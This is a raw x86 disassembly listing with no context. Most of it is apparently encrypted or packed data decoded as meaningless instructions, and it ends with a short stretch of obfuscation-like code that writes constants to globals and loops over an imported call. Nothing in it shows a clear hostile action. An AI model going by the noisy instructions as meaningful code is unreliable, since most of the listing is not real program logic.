  40aac6:	sbb    DWORD PTR [esi],eax
  40aac8:	push   edi
  40aac9:	inc    edi
  40aaca:	and    al,0x5a
  40aacc:	push   0xf29322e5
  40aad1:	nop
  40aad2:	add    DWORD PTR es:[edi],edx
  40aad5:	xchg   ecx,eax
  40aad6:	ficomp DWORD PTR [edi+0x4f0471c6]
  40aadc:	jp     0x40aaa0
  40aade:	outs   dx,DWORD PTR ds:[esi]
  40aadf:	mov    bh,BYTE PTR [ebp+0x5]
  40aae2:	xlat   BYTE PTR ds:[ebx]
  40aae3:	enter  0x33e8,0x71
  40aae7:	es in  eax,dx
  40aae9:	ret    
  40aaea:	add    al,0x7a
  40aaec:	imul   esi,DWORD PTR [edx],0x9667296b
  40aaf2:	fiadd  WORD PTR [ebp+0x4d27d9ec]
  40aaf8:	cli    
  40aaf9:	add    dh,dl
  40aafb:	sub    eax,DWORD PTR [ebp-0x5478cf56]
  40ab01:	push   eax
  40ab02:	pop    esp
  40ab03:	gs (bad) 
  40ab05:	push   ds
  40ab06:	jne    0x40aae2
  40ab08:	(bad)  
  40ab0a:	xlat   BYTE PTR ds:[ebx]
  40ab0b:	push   es
  40ab0c:	outs   dx,DWORD PTR ds:[esi]
  40ab0d:	push   0xffffffb3
  40ab0f:	(bad)  
  40ab10:	retf   
  40ab11:	fcomp  DWORD PTR [ebx+0x4a]
  40ab14:	cmp    BYTE PTR [edx+0x32c2dbd9],0xdc
  40ab1b:	mov    ds:0xf2e326c1,al
  40ab20:	mov    ah,0x2d
  40ab22:	add    edi,DWORD PTR [eax+0x641951ea]
  40ab28:	cmp    ah,bh
  40ab2a:	repnz push ebx
  40ab2c:	push   0xfffffff9
  40ab2e:	ds dec bp
  40ab31:	mov    ds:0x33de999b,al
  40ab36:	cs loope 0x40ab28
  40ab39:	jb     0x40ab2f
  40ab3b:	dec    ecx
  40ab3c:	jae    0x40ab42
  40ab3e:	daa    
  40ab3f:	mov    ebx,DWORD PTR [ebp+esi*4+0x3d2135a5]
  40ab46:	cwde   
  40ab47:	adc    eax,0xdc2b4951
  40ab4c:	xor    ah,BYTE PTR [edx]
  40ab4e:	add    BYTE PTR [ebp-0x7b],bl
  40ab51:	call   0x1ebb381c
  40ab56:	sbb    ecx,DWORD PTR [edx+0x323b9c06]
  40ab5c:	or     DWORD PTR [esp+ebx*1+0x4a],esp
  40ab60:	aas    
  40ab61:	adc    ch,BYTE PTR [ebx-0x30f626f3]
  40ab67:	mov    ebx,0x5a2fce02
  40ab6c:	(bad)  
  40ab6d:	in     al,0xcf
  40ab6f:	dec    edx
  40ab70:	jg     0x40abcf
  40ab72:	pop    ss
  40ab73:	aad    0xb5
  40ab75:	cmp    BYTE PTR [ebx],dh
  40ab77:	lods   al,BYTE PTR ds:[esi]
  40ab78:	cmp    BYTE PTR [ebp+0xdbc451e],ah
  40ab7e:	xor    BYTE PTR [eiz*2+0x3fdc5249],0x5d
  40ab86:	or     eax,0x6490a0fb
  40ab8b:	xchg   ecx,eax
  40ab8c:	mov    edx,DWORD PTR [esi+ecx*1-0x75]
  40ab90:	add    edx,DWORD PTR [ebx-0x11]
  40ab93:	jmp    0x9c2ac3c2
  40ab98:	jp     0x40ab37
  40ab9a:	jmp    0x9d9e:0x496d7d13
  40aba1:	or     bh,al
  40aba3:	or     al,0xee
  40aba5:	cwde   
  40aba6:	in     eax,0x24
  40aba8:	adc    al,0x25
  40abaa:	call   0xe8c24dc4
  40abaf:	lahf   
  40abb0:	inc    ecx
  40abb1:	sub    esp,DWORD PTR [ebx+0x28]
  40abb4:	mov    ebp,0x889ccc08
  40abb9:	ja     0x40abe9
  40abbb:	sti    
  40abbc:	(bad)  
  40abbd:	int    0x86
  40abbf:	clc    
  40abc0:	popa   
  40abc1:	rcr    DWORD PTR [esi+0x45],0xf1
  40abc5:	cmp    BYTE PTR ds:0x765c5661,bl
  40abcb:	fcmove st,st(6)
  40abcd:	pop    ds
  40abce:	inc    ecx
  40abcf:	jl     0x40abf0
  40abd1:	adc    al,0xb1
  40abd3:	into   
  40abd4:	dec    edx
  40abd5:	mov    dl,0xf0
  40abd7:	fistp  QWORD PTR [eax-0x54]
  40abda:	pop    ds
  40abdb:	fmul   DWORD PTR [ebp+edi*1+0x66111518]
  40abe2:	or     ah,BYTE PTR [ebp+0x6fc6939f]
  40abe8:	stc    
  40abe9:	lods   eax,DWORD PTR ds:[esi]
  40abea:	pushf  
  40abeb:	icebp  
  40abec:	push   ss
  40abed:	repnz fldenv [eax+0xe94205c]
  40abf4:	(bad)  
  40abf5:	out    dx,eax
  40abf6:	jmp    0x1a1567ff
  40abfb:	(bad)  
  40abfc:	xor    edx,DWORD PTR [ecx+0x6f]
  40abff:	stos   DWORD PTR es:[edi],eax
  40ac00:	cmp    eax,edx
  40ac02:	mov    dh,0x66
  40ac04:	stos   BYTE PTR es:[edi],al
  40ac05:	push   esi
  40ac06:	cmp    BYTE PTR [esi-0x4afae667],ah
  40ac0c:	adc    al,0x58
  40ac0e:	pop    edi
  40ac0f:	ja     0x40ac7e
  40ac11:	mov    ds:0x93db1138,al
  40ac16:	inc    ebp
  40ac17:	scas   al,BYTE PTR es:[edi]
  40ac18:	ret    
  40ac19:	rcl    DWORD PTR ds:0xc5e8ef91,0x7
  40ac20:	add    BYTE PTR [ebp-0x70],dl
  40ac23:	push   edx
  40ac24:	nop
  40ac25:	pop    edi
  40ac26:	retf   0x3b40
  40ac29:	mov    bh,0x81
  40ac2b:	sub    bl,BYTE PTR [eax]
  40ac2d:	mov    cl,0x71
  40ac2f:	fistp  DWORD PTR [ecx+0x4b]
  40ac32:	leave  
  40ac33:	dec    eax
  40ac34:	ficom  DWORD PTR ds:0xac46c09b
  40ac3a:	xor    bh,BYTE PTR [esi*2+0x5e348a7]
  40ac41:	shl    BYTE PTR [edi],0xfe
  40ac44:	push   0xcc61c8be
  40ac49:	arpl   cx,cx
  40ac4b:	rcl    BYTE PTR [ebx-0x652fb86],1
  40ac51:	sub    al,BYTE PTR [ebx-0x16]
  40ac54:	jbe    0x40ac3a
  40ac56:	add    DWORD PTR [ebx+0x5398071a],edi
  40ac5c:	popa   
  40ac5d:	mov    ebp,0xf6f37686
  40ac62:	int3   
  40ac63:	or     cl,ah
  40ac65:	jne    0x40ac22
  40ac67:	aas    
  40ac68:	aaa    
  40ac69:	cdq    
  40ac6a:	adc    ebp,DWORD PTR [edi-0x5fc33790]
  40ac70:	retf   
  40ac71:	jecxz  0x40ac40
  40ac73:	das    
  40ac74:	mov    DWORD PTR ds:0x5ca678b1,esp
  40ac7a:	cdq    
  40ac7b:	jle    0x40ac25
  40ac7d:	sti    
  40ac7e:	push   ebp
  40ac7f:	push   ebx
  40ac80:	mov    esp,0xfde016e0
  40ac85:	sti    
  40ac86:	xchg   DWORD PTR [edx-0x8],esi
  40ac89:	ret    
  40ac8a:	add    ch,ah
  40ac8c:	mov    ds:0xd343f01c,al
  40ac91:	lahf   
  40ac92:	pop    ebx
  40ac93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac94:	xor    eax,0x718b9ddc
  40ac99:	inc    ecx
  40ac9a:	sahf   
  40ac9b:	adc    eax,0xc06e76c6
  40aca0:	cmp    DWORD PTR [ebx],edx
  40aca2:	scas   al,BYTE PTR es:[edi]
  40aca3:	jnp    0x40ad08
  40aca5:	dec    edx
  40aca6:	ror    esi,1
  40aca8:	mov    ah,0x42
  40acaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acab:	add    al,0x51
  40acad:	pop    ebp
  40acae:	cmp    DWORD PTR [ebx],esp
  40acb0:	mov    ah,0xf8
  40acb2:	dec    eax
  40acb3:	cld    
  40acb4:	sub    eax,0xb58e5def
  40acb9:	adc    ebx,DWORD PTR [ebx]
  40acbb:	mov    al,ds:0x4cb2ddc8
  40acc0:	mov    ds:0xb8b34882,al
  40acc5:	xor    DWORD PTR [ebp-0x57],ebp
  40acc8:	mov    eax,0x309b8525
  40accd:	cli    
  40acce:	call   0x828b:0xf4cb0345
  40acd5:	ins    DWORD PTR es:[edi],dx
  40acd6:	popf   
  40acd7:	jbe    0x40ac62
  40acd9:	je     0x40ad43
  40acdb:	dec    esi
  40acdc:	lock gs push ds
  40acdf:	jnp    0x40acef
  40ace1:	push   0x30cbc2e4
  40ace6:	cdq    
  40ace7:	jnp    0x40ad0c
  40ace9:	call   0xb72918dc
  40acee:	loop   0x40ad05
  40acf0:	mov    al,0x97
  40acf2:	mov    edi,0x265becaf
  40acf7:	pop    ebp
  40acf8:	adc    BYTE PTR [edi+0x1dac89d1],0xe9
  40acff:	mov    dh,0xb6
  40ad01:	mov    eax,0xc069d084
  40ad06:	or     BYTE PTR [ecx],ah
  40ad08:	xlat   BYTE PTR ds:[ebx]
  40ad09:	gs cwde 
  40ad0b:	xchg   esp,eax
  40ad0c:	outs   dx,DWORD PTR ds:[esi]
  40ad0d:	jecxz  0x40acf9
  40ad0f:	lea    eax,[ebp-0x371510c0]
  40ad15:	ds ds scas al,BYTE PTR es:[edi]
  40ad18:	inc    DWORD PTR [edx-0x6790bef9]
  40ad1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad1f:	jge    0x40ad93
  40ad21:	stos   DWORD PTR es:[edi],eax
  40ad22:	aam    0x90
  40ad24:	shl    bl,1
  40ad26:	rcpps  xmm1,XMMWORD PTR [esi+0x53]
  40ad2a:	push   ecx
  40ad2b:	scas   al,BYTE PTR es:[edi]
  40ad2c:	inc    edi
  40ad2d:	or     DWORD PTR [ebx+ebx*4],edi
  40ad30:	or     dl,0x90
  40ad33:	psubb  mm5,QWORD PTR ds:0xc504eef2
  40ad3a:	inc    edi
  40ad3b:	cld    
  40ad3c:	and    DWORD PTR [eax],0xe740d684
  40ad42:	jns    0x40ad1f
  40ad44:	dec    ecx
  40ad45:	clc    
  40ad46:	xchg   ebp,esp
  40ad48:	pop    ebp
  40ad49:	sub    dh,al
  40ad4b:	push   edi
  40ad4c:	lock add DWORD PTR [ebx+0x401b329f],edi
  40ad53:	or     ebx,ebx
  40ad55:	lods   eax,DWORD PTR ds:[esi]
  40ad56:	loope  0x40acfb
  40ad58:	xor    al,0x56
  40ad5a:	lods   eax,DWORD PTR ds:[esi]
  40ad5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad5c:	pop    ebx
  40ad5d:	dec    ebx
  40ad5e:	mov    ah,0xec
  40ad60:	arpl   WORD PTR [esi-0x10],di
  40ad63:	jle    0x40ada7
  40ad65:	inc    ebp
  40ad66:	add    esi,DWORD PTR [edi]
  40ad68:	xchg   bl,ch
  40ad6a:	rol    BYTE PTR [edx-0x42],0x79
  40ad6e:	jmp    0xc575:0x349b2975
  40ad75:	mov    ds:0xcb318257,al
  40ad7a:	rcr    DWORD PTR [ebx+0x75],0xa9
  40ad7e:	ins    BYTE PTR es:[edi],dx
  40ad7f:	(bad)  
  40ad80:	mov    DWORD PTR [ebp+0x7a],0x9f9afb08
  40ad87:	cli    
  40ad88:	es hlt 
  40ad8a:	push   cs
  40ad8b:	jl     0x40ad5c
  40ad8d:	rcl    DWORD PTR [eax-0x5c],cl
  40ad90:	push   ebx
  40ad91:	sahf   
  40ad92:	fild   DWORD PTR [eax+0x5a]
  40ad95:	push   ecx
  40ad96:	mov    bl,0xf6
  40ad98:	mov    ebp,0xd5407f8f
  40ad9d:	es sub al,0xe0
  40ada0:	arpl   WORD PTR [ebx-0x444ec9de],sp
  40ada6:	and    ebx,DWORD PTR cs:[edx+eax*2+0x1d]
  40adab:	sbb    eax,0xd2469309
  40adb0:	xor    esi,ebx
  40adb2:	pop    edx
  40adb3:	and    eax,0x48c1f41f
  40adb8:	out    dx,al
  40adb9:	shl    BYTE PTR [eax+esi*4+0x37d8cb7f],0x80
  40adc1:	cmp    ebp,DWORD PTR [esi-0x7108f34b]
  40adc7:	clc    
  40adc8:	adc    DWORD PTR [ebx+0x470dac47],0x1e5f464
  40add2:	xchg   BYTE PTR [ebx-0x9],bl
  40add5:	add    DWORD PTR [esi-0x339b67e9],eax
  40addb:	mov    eax,0x29356a28
  40ade0:	pop    eax
  40ade1:	push   ss
  40ade2:	push   esp
  40ade3:	mov    BYTE PTR [edx-0x18],dl
  40ade6:	cmp    al,0xd8
  40ade8:	xchg   esi,esi
  40adea:	add    ah,BYTE PTR [edi]
  40adec:	and    ah,BYTE PTR [ebp-0x42e32fbe]
  40adf2:	sbb    esi,DWORD PTR [ecx-0x372d5ba2]
  40adf8:	sbb    DWORD PTR [edx+0x3bd17452],esi
  40adfe:	adc    al,0xca
  40ae00:	aam    0x52
  40ae02:	mov    DWORD PTR [esi],edi
  40ae04:	aad    0xf4
  40ae06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae07:	test   eax,0x7a59b4bf
  40ae0c:	outs   dx,DWORD PTR ds:[esi]
  40ae0d:	scas   al,BYTE PTR es:[edi]
  40ae0e:	inc    ecx
  40ae0f:	push   0xffffff9a
  40ae11:	push   DWORD PTR [esi-0x58]
  40ae14:	mov    dh,dl
  40ae16:	mov    eax,ds:0xdae173b4
  40ae1b:	pop    ebx
  40ae1c:	(bad)  
  40ae1d:	into   
  40ae1e:	sbb    dl,BYTE PTR [edi+ecx*1-0x5355d5d7]
  40ae25:	mov    dl,0x31
  40ae27:	cmp    eax,0x21595aad
  40ae2c:	mov    ?,WORD PTR [ebx]
  40ae2e:	sbb    ebx,DWORD PTR [eax]
  40ae30:	scas   eax,DWORD PTR es:[edi]
  40ae31:	lods   eax,DWORD PTR ds:[esi]
  40ae32:	inc    ebx
  40ae33:	sub    DWORD PTR [eax+0x2ddbeb9],0xd691f6a9
  40ae3d:	jns    0x40ae84
  40ae3f:	push   edx
  40ae40:	fisttp WORD PTR [esi+eiz*4-0x6f154dd4]
  40ae47:	test   DWORD PTR [edi],0x2fdfc06f
  40ae4d:	add    al,0x35
  40ae4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae50:	sahf   
  40ae51:	inc    edi
  40ae52:	mov    cl,0x1a
  40ae54:	fcomip st,st(6)
  40ae56:	js     0x40ae7c
  40ae58:	call   0x26ed:0xbc307304
  40ae5f:	or     al,0x59
  40ae61:	int3   
  40ae62:	xchg   DWORD PTR [ecx+0x3c0bc9b0],edx
  40ae68:	adc    eax,0x2ffeac06
  40ae6d:	inc    eax
  40ae6e:	push   ebx
  40ae6f:	xchg   esi,eax
  40ae70:	aaa    
  40ae71:	push   edi
  40ae72:	mov    dl,0x6b
  40ae74:	mov    dl,0x80
  40ae76:	add    al,0x70
  40ae78:	dec    ecx
  40ae79:	sbb    BYTE PTR [edx+0x36],ch
  40ae7c:	imul   edi,DWORD PTR [ebp-0x1d],0xfffffff5
  40ae80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae81:	mov    esp,0x1633565d
  40ae86:	and    eax,0xdbd2d100
  40ae8b:	sbb    eax,0xdf16de47
  40ae90:	jecxz  0x40ae29
  40ae92:	test   BYTE PTR [ebx+0x10],cl
  40ae95:	mov    ss,WORD PTR [eax+0x45f9c07f]
  40ae9b:	mov    BYTE PTR [ecx+0x5b],ch
  40ae9e:	push   ebx
  40ae9f:	xor    al,0xa2
  40aea1:	sub    BYTE PTR [edx+0xac3e44b],0x1e
  40aea8:	xchg   ecx,eax
  40aea9:	shl    DWORD PTR [ebp+0x43c3c574],cl
  40aeaf:	fnsave [esi+0x2dcbf217]
  40aeb5:	lock adc DWORD PTR ds:0x4eda7fd3,0x25938e42
  40aec0:	mov    eax,ds:0x77c765a0
  40aec5:	lahf   
  40aec6:	bnd jle 0x40ae8d
  40aec9:	xor    al,0x20
  40aecb:	enter  0x9b42,0x3e
  40aecf:	xchg   eax,esi
  40aed1:	jmp    0xce89:0xbcc1005c
  40aed8:	inc    edi
  40aed9:	rcl    DWORD PTR [edx+eiz*8],cl
  40aedc:	inc    ebx
  40aedd:	and    al,0x8d
  40aedf:	cmp    BYTE PTR [esp+edx*1+0x48],0x32
  40aee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee5:	add    ch,bh
  40aee7:	or     BYTE PTR [eax-0x29],ch
  40aeea:	cmp    DWORD PTR [ecx+0x13755d08],0xd5694f75
  40aef4:	mov    WORD PTR [edx],cs
  40aef6:	mov    BYTE PTR [edi+edx*2-0x7d],dl
  40aefa:	imul   esp
  40aefc:	dec    esp
  40aefd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aefe:	jg     0x40ae86
  40af00:	leave  
  40af01:	push   ebp
  40af02:	push   ebp
  40af03:	ds in  al,0x37
  40af06:	xor    ebp,edi
  40af08:	daa    
  40af09:	inc    edx
  40af0a:	pusha  
  40af0b:	icebp  
  40af0c:	push   edi
  40af0d:	iret   
  40af0e:	and    DWORD PTR [edx-0xd081608],esi
  40af14:	sbb    eax,0x3dcf68ff
  40af19:	retf   0x88ca
  40af1c:	rol    DWORD PTR [eax+0x2],0xd1
  40af20:	sub    al,0xb4
  40af22:	stc    
  40af23:	sahf   
  40af24:	dec    esi
  40af25:	push   es
  40af26:	fdivr  DWORD PTR [edi]
  40af28:	test   BYTE PTR gs:[esi-0x1f],0xb
  40af2d:	dec    eax
  40af2e:	fild   DWORD PTR [ecx+0x61570448]
  40af34:	pop    ebp
  40af35:	ror    BYTE PTR [edi+0x35],1
  40af38:	mov    ecx,edi
  40af3a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40af3c:	mov    ch,0x27
  40af3e:	mov    bl,0x1f
  40af40:	inc    ebp
  40af41:	lods   eax,DWORD PTR ds:[esi]
  40af42:	xchg   eax,edx
  40af44:	push   esi
  40af45:	(bad)  
  40af46:	push   ebx
  40af47:	lods   eax,DWORD PTR ds:[esi]
  40af48:	in     al,dx
  40af49:	add    eax,esi
  40af4b:	xor    eax,0x27860975
  40af50:	imul   ebp,DWORD PTR [eax+ebp*1-0x17],0x6cf5608c
  40af58:	in     al,0x42
  40af5a:	mov    cl,0xdb
  40af5c:	call   0xe6d1:0xb6ae23e9
  40af63:	addr16 adc eax,0xcdd0fc8c
  40af69:	jmp    0xb4ccc235
  40af6e:	mov    ebp,0xc89b708f
  40af73:	jno    0x40af7b
  40af75:	ja     0x40af01
  40af77:	faddp  st(6),st
  40af79:	test   BYTE PTR [ebx],ch
  40af7b:	popf   
  40af7c:	sbb    eax,0xb2318c1f
  40af81:	mov    ch,0x2
  40af83:	inc    edx
  40af84:	xchg   esi,edx
  40af86:	out    dx,al
  40af87:	mov    ebx,0x83d198d6
  40af8c:	out    dx,eax
  40af8d:	sar    BYTE PTR [ebx+0x30],0x8
  40af91:	mov    ?,WORD PTR [ecx-0x47]
  40af94:	pusha  
  40af95:	or     BYTE PTR [ebx+0x52],dh
  40af98:	cdq    
  40af99:	pop    ebp
  40af9a:	mov    ecx,DWORD PTR [edx+esi*4]
  40af9d:	stos   BYTE PTR es:[edi],al
  40af9e:	inc    ecx
  40af9f:	mov    al,0xcb
  40afa1:	scas   eax,DWORD PTR es:[edi]
  40afa2:	add    al,0xa1
  40afa4:	mov    bh,0x6a
  40afa6:	mov    ch,0x69
  40afa8:	dec    ebx
  40afa9:	mov    ecx,0x4dc945de
  40afae:	retf   
  40afaf:	dec    esp
  40afb0:	inc    ebp
  40afb1:	pushf  
  40afb2:	cmp    al,0x40
  40afb4:	je     0x40afba
  40afb6:	jle    0x40af38
  40afb8:	sub    al,0x4a
  40afba:	imul   edi,DWORD PTR [ecx+0x75],0xbcffc492
  40afc1:	dec    esi
  40afc2:	(bad)  
  40afc3:	aam    0xce
  40afc5:	gs pop esi
  40afc7:	jecxz  0x40b045
  40afc9:	faddp  st(2),st
  40afcb:	daa    
  40afcc:	and    DWORD PTR ds:0xedc5473c,esp
  40afd2:	sbb    eax,0x134e124a
  40afd7:	xchg   ch,dl
  40afd9:	ins    DWORD PTR es:[edi],dx
  40afda:	push   ebx
  40afdb:	hlt    
  40afdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afdd:	adc    dl,BYTE PTR [eax+0x79669cdd]
  40afe3:	(bad)  [eax]
  40afe5:	push   0x8e5510ed
  40afea:	cmp    al,0x5c
  40afec:	aad    0x4f
  40afee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afef:	jns    0x40afac
  40aff1:	cld    
  40aff2:	xchg   ecx,eax
  40aff3:	inc    esi
  40aff4:	imul   ebx,eax,0x68e12b31
  40affa:	xor    ecx,DWORD PTR [edx-0x1c488cf8]
  40b000:	mov    eax,ds:0x55a9031e
  40b005:	fmul   QWORD PTR [edx+0x70f2b727]
  40b00b:	popa   
  40b00c:	popa   
  40b00d:	jmp    0x4ec9e42f
  40b012:	jb     0x40afa9
  40b014:	jbe    0x40b077
  40b016:	out    dx,eax
  40b017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b018:	int3   
  40b019:	jmp    0x45c57107
  40b01e:	push   cs
  40b01f:	imul   edx,DWORD PTR [eax+0x4e],0x67
  40b023:	mov    ds:0x2f82d5a4,al
  40b028:	sub    al,0x71
  40b02a:	ds call 0x9b80:0x3d17138e
  40b032:	daa    
  40b033:	add    ebp,ebp
  40b035:	jo     0x40b057
  40b037:	arpl   WORD PTR [ecx+0x24be7835],bx
  40b03d:	cmc    
  40b03e:	mov    esp,0xc0d52026
  40b043:	cmp    al,0xba
  40b045:	sahf   
  40b046:	mov    eax,0xdd6236c1
  40b04b:	mov    DWORD PTR [edi-0x3046f0fb],0x3a5d8fc2
  40b055:	nop
  40b056:	repnz mov WORD PTR [edi+0x27],?
  40b05a:	pop    es
  40b05b:	(bad)  
  40b05c:	jnp    0x40b09c
  40b05e:	sub    DWORD PTR [edi+0x587b9a2f],ebp
  40b064:	sti    
  40b065:	cwde   
  40b066:	sub    ebx,ecx
  40b068:	imul   edx,DWORD PTR ds:0x31d20f22,0x75
  40b06f:	adc    bl,BYTE PTR [esi+0x605e36e5]
  40b075:	add    al,0x64
  40b077:	outs   dx,BYTE PTR ds:[esi]
  40b078:	xchg   esp,eax
  40b079:	push   esi
  40b07a:	arpl   si,ax
  40b07c:	push   0x36025486
  40b081:	fxch   st(2)
  40b083:	int3   
  40b084:	or     DWORD PTR [esi*1+0xa02198e],edx
  40b08b:	sar    BYTE PTR [edi+0x3ab4d4f6],1
  40b091:	aad    0x86
  40b093:	icebp  
  40b094:	xchg   ecx,eax
  40b095:	dec    esp
  40b096:	jns    0x40b100
  40b098:	sbb    dl,BYTE PTR [ebx]
  40b09a:	pop    esp
  40b09b:	add    BYTE PTR [ecx],ch
  40b09d:	inc    ebx
  40b09e:	pushf  
  40b09f:	into   
  40b0a0:	jmp    0xd5a5:0xa86273c4
  40b0a7:	aas    
  40b0a8:	pusha  
  40b0a9:	aaa    
  40b0aa:	mov    bh,0x61
  40b0ac:	cmp    BYTE PTR [edx+edx*1],cl
  40b0af:	pusha  
  40b0b0:	lods   al,BYTE PTR ds:[esi]
  40b0b1:	cmp    BYTE PTR [edx],0x5c
  40b0b4:	xor    dh,BYTE PTR [ebx-0x1e24c7c3]
  40b0ba:	sub    ax,0x3de5
  40b0be:	test   DWORD PTR [ebx+esi*4-0x2f86a703],0x7b3875a8
  40b0c9:	inc    esi
  40b0ca:	inc    ebx
  40b0cb:	inc    eax
  40b0cc:	sbb    al,0xaa
  40b0ce:	mov    ah,0x92
  40b0d0:	inc    esi
  40b0d1:	push   esi
  40b0d2:	call   0xe987ba56
  40b0d7:	lea    edx,[esi+ecx*1-0x2cdf574c]
  40b0de:	test   eax,0x3a8bccac
  40b0e3:	add    al,0xb2
  40b0e5:	(bad)  
  40b0e7:	inc    BYTE PTR [esp+edx*4]
  40b0ea:	ss mov ebp,0x36de6371
  40b0f0:	stc    
  40b0f1:	inc    esp
  40b0f2:	test   DWORD PTR [ecx+0x2596a63e],0x76fc58c9
  40b0fc:	mov    dl,0xb8
  40b0fe:	xor    eax,DWORD PTR [edi+0x511de6eb]
  40b104:	xchg   edx,eax
  40b105:	add    DWORD PTR [ecx],ebx
  40b107:	and    eax,0xc7a003be
  40b10c:	cdq    
  40b10d:	aas    
  40b10e:	mov    edi,0x4710a338
  40b113:	or     edx,DWORD PTR [ecx-0x77]
  40b116:	jnp    0x40b187
  40b118:	and    ebp,ecx
  40b11a:	loop   0x40b16f
  40b11c:	sub    bl,bl
  40b11e:	sbb    eax,0xeb57a0c1
  40b123:	jmp    0xda9c:0xc8ffeab0
  40b12a:	cmp    al,0x4a
  40b12c:	sub    ch,BYTE PTR [eax]
  40b12e:	xor    BYTE PTR [ecx],bl
  40b130:	xor    dl,BYTE PTR [ecx]
  40b132:	pop    edi
  40b133:	push   ss
  40b134:	pushf  
  40b135:	xchg   edx,eax
  40b136:	mov    ecx,0x9fa0021a
  40b13b:	pop    es
  40b13c:	nop
  40b13d:	or     ebp,DWORD PTR [edx]
  40b13f:	push   ebx
  40b140:	xchg   DWORD PTR [ecx],eax
  40b142:	xchg   edi,eax
  40b143:	inc    ebx
  40b144:	in     al,0xff
  40b146:	xchg   esp,eax
  40b147:	push   edi
  40b148:	cmp    DWORD PTR [ebx],esi
  40b14a:	sub    BYTE PTR [ecx+0x742c6be7],ch
  40b150:	mov    dh,0xc2
  40b152:	pop    edx
  40b153:	mov    bl,0x61
  40b155:	adc    BYTE PTR [esi-0x65499972],ah
  40b15b:	pop    ebx
  40b15c:	int3   
  40b15d:	fs pop ebx
  40b160:	push   ecx
  40b161:	inc    edx
  40b162:	xchg   dl,dl
  40b164:	dec    ebp
  40b165:	dec    edi
  40b166:	stos   DWORD PTR es:[edi],eax
  40b167:	dec    ebx
  40b168:	or     BYTE PTR [ecx],cl
  40b16a:	adc    al,al
  40b16c:	int    0x26
  40b16e:	cs dec edi
  40b170:	popa   
  40b171:	xor    eax,0x26535e49
  40b176:	ja     0x40b1b2
  40b178:	mov    dh,0xd6
  40b17a:	dec    esi
  40b17b:	aas    
  40b17c:	xchg   esi,eax
  40b17d:	xchg   esp,eax
  40b17e:	push   es
  40b17f:	inc    esi
  40b180:	fdivr  QWORD PTR [edi]
  40b182:	jae    0x40b129
  40b184:	ins    BYTE PTR es:[edi],dx
  40b185:	sbb    esp,DWORD PTR [ecx-0x47c838e]
  40b18b:	push   esp
  40b18c:	mov    BYTE PTR [ecx-0x7715be9f],ch
  40b192:	enter  0x1ab0,0x1d
  40b196:	mov    edi,0x8b18458b
  40b19b:	jne    0x40b1ad
  40b19d:	mov    DWORD PTR [esi+0xc],eax
  40b1a0:	mov    eax,DWORD PTR [ebp+0x1c]
  40b1a3:	mov    esi,DWORD PTR [ebp+0x10]
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d46c
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff1e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
